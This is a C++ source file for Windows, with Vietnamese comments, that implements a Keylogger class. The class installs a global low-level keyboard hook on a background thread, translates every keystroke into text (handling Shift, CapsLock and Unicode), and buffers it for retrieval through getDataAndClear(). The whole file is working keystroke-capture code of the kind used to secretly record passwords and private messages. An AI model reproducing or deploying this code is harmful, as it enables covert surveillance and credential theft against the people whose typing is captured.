#include "KeyboardController.h"
#ifdef _WIN32

// Khởi tạo các biến static
HHOOK Keylogger::_hook = NULL;
vector<std::string> Keylogger::_buffer;
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false) {}

Keylogger::~Keylogger() {
    Stop(); // Đảm bảo dừng thread khi hủy class
}

// --- PHẦN 1: Logic xử lý chuỗi ---
void Keylogger::append(const std::string& str) {
    // Thread-safe buffer access - tối ưu: reserve trước để tránh reallocation
    std::lock_guard<std::mutex> lock(_mtx);
    if (_buffer.capacity() < _buffer.size() + 10) {
        _buffer.reserve(_buffer.size() * 2 + 256); // Double capacity khi cần
    }
    _buffer.push_back(str);
}

// --- PHẦN 2: Hàm xử lý phím (Hook Procedure) ---
LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Process valid keydown events only
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        int key = kbdStruct->vkCode; // Lấy mã phím ảo

        if (key == VK_RETURN) append("[RETURN]");
        else if (key == VK_TAB) append("[TAB]");
        else if (key == VK_SPACE) append(" ");
        else if (key == VK_BACK) append("[DELETE]");
        else if (key == VK_DELETE) append("[DEL]");
        else if (key == VK_ESCAPE) append("[ESC]");
        else if (key == VK_LWIN || key == VK_RWIN) append("[CMD]");
        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) append("[SHIFT]");
        else if (key == VK_CAPITAL) append("[CAPS]");
        else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) append("[OPT]");
        else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) append("[CTRL]");
        else if (key == VK_LEFT) append("[LEFT]");
        else if (key == VK_RIGHT) append("[RIGHT]");
        else if (key == VK_UP) append("[UP]");
        else if (key == VK_DOWN) append("[DOWN]");
        else if (key == VK_HOME) append("[HOME]");
        else if (key == VK_END) append("[END]");
        else if (key == VK_PRIOR) append("[PGUP]");
        else if (key == VK_NEXT) append("[PGDN]");
        else if (key == VK_INSERT) append("[INS]");
        else if (key == VK_F1) append("[F1]");
        else if (key == VK_F2) append("[F2]");
        else if (key == VK_F3) append("[F3]");
        else if (key == VK_F4) append("[F4]");
        else if (key == VK_F5) append("[F5]");
        else if (key == VK_F6) append("[F6]");
        else if (key == VK_F7) append("[F7]");
        else if (key == VK_F8) append("[F8]");
        else if (key == VK_F9) append("[F9]");
        else if (key == VK_F10) append("[F10]");
        else if (key == VK_F11) append("[F11]");
        else if (key == VK_F12) append("[F12]");
        else if (key == VK_F13) append("[F13]");
        else if (key == VK_F14) append("[F14]");
        else if (key == VK_F15) append("[F15]");
        else if (key == VK_NUMLOCK) append("[NUMLOCK]");
        else if ((key >= VK_0 && key <= VK_9) || (key >= VK_A && key <= VK_Z)) {
             // Xử lý phím số và chữ - cần kiểm tra Shift để có ký tự đặc biệt
             BYTE keyState[256];
             if (GetKeyboardState(keyState)) {
                 bool isShift = (keyState[VK_SHIFT] & 0x80) != 0;
                 bool isCapsLock = (keyState[VK_CAPITAL] & 0x01) != 0;
                 
                 if (key >= VK_A && key <= VK_Z) {
                     // Chữ cái - xử lý Shift và CapsLock
                     char c = (char)('A' + (key - VK_A));
                     if ((isShift && !isCapsLock) || (!isShift && isCapsLock)) {
                         append(std::string(1, c)); // Uppercase
                     } else {
                         append(std::string(1, c + 32)); // Lowercase
                     }
                 } else if (key >= VK_0 && key <= VK_9) {
                     // Số - xử lý Shift để có ký tự đặc biệt
                     char numChars[] = "0123456789";
                     char specialChars[] = ")!@#$%^&*(";
                     int index = key - VK_0;
                     if (isShift && index < 10) {
                         append(std::string(1, specialChars[index]));
                     } else {
                         append(std::string(1, numChars[index]));
                     }
                 }
             } else {
                 // Fallback: dùng ToUnicode trực tiếp
                 WCHAR unicodeChars[4] = {0};
                 BYTE fallbackKeyState[256] = {0};
                 if (GetKeyboardState(fallbackKeyState)) {
                     int result = ToUnicode(key, 0, fallbackKeyState, unicodeChars, 4, 0);
                     if (result > 0) {
                         std::wstring wstr(unicodeChars, result);
                         int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), NULL, 0, NULL, NULL);
                         if (size_needed > 0) {
                             std::string utf8Str(size_needed, 0);
                             WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), &utf8Str[0], size_needed, NULL, NULL);
                             append(utf8Str);
                         } else {
                             append("[" + std::to_string(key) + "]");
                         }
                     } else {
                         append("[" + std::to_string(key) + "]");
                     }
                 } else {
                     append("[" + std::to_string(key) + "]");
                 }
             }
        }
        else {
             // Dùng ToUnicode() thay vì ToAscii() để xử lý Unicode và phím đặc biệt tốt hơn
             BYTE keyState[256];
             WCHAR unicodeChars[4] = {0};
             
             if (GetKeyboardState(keyState)) {
                 // ToUnicode() xử lý tốt hơn Unicode, dead keys, và các ký tự đặc biệt
                 int result = ToUnicode(key, 0, keyState, unicodeChars, 4, 0);
                 
                 if (result > 0) {
                     // Có ký tự Unicode hợp lệ
                     std::wstring wstr(unicodeChars, result);
                     
                     // Convert Unicode to UTF-8
                     int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), NULL, 0, NULL, NULL);
                     if (size_needed > 0) {
                         std::string utf8Str(size_needed, 0);
                         WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), &utf8Str[0], size_needed, NULL, NULL);
                         append(utf8Str);
                     } else {
                         // Fallback: thử ToAscii cho ASCII
                         WORD translated[2] = {0};
                         int asciiResult = ToAscii(key, 0, keyState, translated, 0);
                         if (asciiResult == 1 && translated[0] >= 32 && translated[0] <= 126) {
                             append(std::string(1, (char)translated[0]));
                         } else {
                             append("[" + std::to_string(key) + "]");
                         }
                     }
                 } else if (result == -1) {
                     // Dead key - bỏ qua, sẽ được xử lý ở lần nhấn tiếp theo
                 } else {
                     // Không có ký tự - thử ToAscii
                     WORD translated[2] = {0};
                     int asciiResult = ToAscii(key, 0, keyState, translated, 0);
                     if (asciiResult == 1 && translated[0] >= 32 && translated[0] <= 126) {
                         append(std::string(1, (char)translated[0]));
                     } else {
                         // Xử lý các phím đặc biệt khác
                         if (key == VK_OEM_1) append(";");      // ;:
                         else if (key == VK_OEM_PLUS) append("="); // =+
                         else if (key == VK_OEM_COMMA) append(","); // ,<
                         else if (key == VK_OEM_MINUS) append("-"); // -_
                         else if (key == VK_OEM_PERIOD) append("."); // .>
                         else if (key == VK_OEM_2) append("/");  // /?
                         else if (key == VK_OEM_3) append("`"); // `~
                         else if (key == VK_OEM_4) append("[");  // [{
                         else if (key == VK_OEM_5) append("\\"); // \|
                         else if (key == VK_OEM_6) append("]");  // ]}
                         else if (key == VK_OEM_7) append("'"); // '"
                         else {
                             append("[" + std::to_string(key) + "]");
                         }
                     }
                 }
             } else {
                 append("[" + std::to_string(key) + "]");
             }
        }
    }
    // Forward event to next hook (required for keyboard to work)
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// --- PHẦN 3: Quản lý luồng (Threading) ---
void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    // Tạo luồng riêng để lắng nghe
    _workerThread = std::thread([this]() {
        // Cài đặt Hook
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

        // Vòng lặp tin nhắn (Message Loop)
        // Bắt buộc phải có để Hook hoạt động trên Windows
        MSG msg;
        while (_isRunning && GetMessage(&msg, NULL, 0, 0)) {
            if (msg.message == WM_QUIT) break; // Nhận lệnh thoát thì dừng
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // Dọn dẹp hook khi vòng lặp kết thúc
        if (_hook) {
            UnhookWindowsHookEx(_hook);
            _hook = NULL;
        }
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    // Gửi tin nhắn WM_QUIT vào luồng worker để đánh thức GetMessage và thoát vòng lặp
    if (_workerThread.joinable()) {
        PostThreadMessage(GetThreadId(_workerThread.native_handle()), WM_QUIT, 0, 0);
        _workerThread.join();
    }
}

// --- PHẦN 4: Lấy dữ liệu an toàn ---
vector<std::string> Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx); // Khóa lại!
    
    if (_buffer.empty()) {
        return {};
    }
    
    // Dùng move semantics thay vì copy - nhanh hơn nhiều
    vector<std::string> result = std::move(_buffer);
    _buffer.clear();
    _buffer.reserve(256); // Reserve lại để tránh reallocation cho lần sau
    
    return result; // Trả về bằng move
} // Tự động mở khóa
#endif